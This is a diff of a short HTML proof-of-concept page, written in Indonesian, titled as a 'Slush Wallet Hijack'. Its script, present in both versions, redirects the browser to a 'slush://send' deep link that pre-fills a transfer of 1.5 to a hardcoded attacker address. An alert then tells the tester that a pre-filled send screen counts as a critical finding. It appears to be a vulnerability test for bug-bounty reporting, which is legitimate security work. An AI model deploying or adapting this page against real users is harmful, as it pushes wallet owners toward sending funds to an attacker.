@@ -5,79 +5,41 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>PoC Critical | Slush Wallet Hijack</title>
     <style>
-        body { 
-            background: #000; 
-            color: #fff; 
-            font-family: -apple-system, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .card { 
-            border: 2px solid #ff0055; 
-            padding: 30px; 
-            border-radius: 15px; 
-            text-align: center; 
-            background: #111; 
-            box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); 
-            max-width: 350px;
-        }
-        h2 { color: #ff0055; margin-top: 0; }
-        p { color: #888; font-size: 14px; margin-bottom: 25px; }
-        button { 
-            background: #ff0055; 
-            color: white; 
-            border: none; 
-            padding: 15px 20px; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            width: 100%; 
-            font-size: 14px;
-        }
-        .log { 
-            margin-top: 20px; 
-            font-family: monospace; 
-            font-size: 11px; 
-            color: #00ff00; 
-            text-align: left;
-            border-top: 1px solid #333;
-            padding-top: 10px;
-        }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px; }
+        .box { border: 2px solid #ff0055; padding: 25px; border-radius: 12px; background: #111; display: inline-block; }
+        button { background: #ff0055; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .log { margin-top: 15px; font-size: 12px; color: #00ff00; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="box">
     <h2>CRITICAL PoC</h2>
-    <p>Uji coba eksploitasi pengisian otomatis transaksi melalui Deep Link.</p>
+    <p>Uji coba pengisian otomatis transaksi (Auto-fill).</p>
     
-    <button onclick="triggerExploit()">JALANKAN EKSPLOITASI</button>
+    <button onclick="runExploit()">JALANKAN EKSPLOITASI</button>
     
-    <div class="log" id="status">> Status: Menunggu interaksi...</div>
+    <div id="status" class="log">> Menunggu interaksi...</div>
 </div>
 
 <script>
-    function triggerExploit() {
-        const status = document.getElementById('status');
+    function runExploit() {
+        const out = document.getElementById('status');
         
-        
-        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
-        const amount = "1.5";
+       
+        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"; //
+        const amount = "1.5"; //
         
       
-        const maliciousUri = `slush://send?to=${attackerAddress}&amount=${amount}`;
+        const maliciousUri = `slush://send?to=${attackerAddress}&amount=${amount}`; //
 
-        status.innerHTML = `> Memicu URI: <br>${maliciousUri}`;
+        out.innerText = "Triggering: " + maliciousUri; //
         
-        
-        window.location.href = maliciousUri;
+    
+        window.location.href = maliciousUri; //
 
-      
         setTimeout(() => {
-            alert("PERIKSA DOMPET:\nJika layar kirim terbuka dengan alamat 0x742... dan jumlah 1.5 terisi otomatis, temuan ini adalah CRITICAL.");
+            alert("PERIKSA DOMPET:\nJika layar kirim terbuka dengan alamat 0x742... dan jumlah 1.5 terisi otomatis, temuan ini adalah CRITICAL."); //
         }, 1000);
     }
 </script>
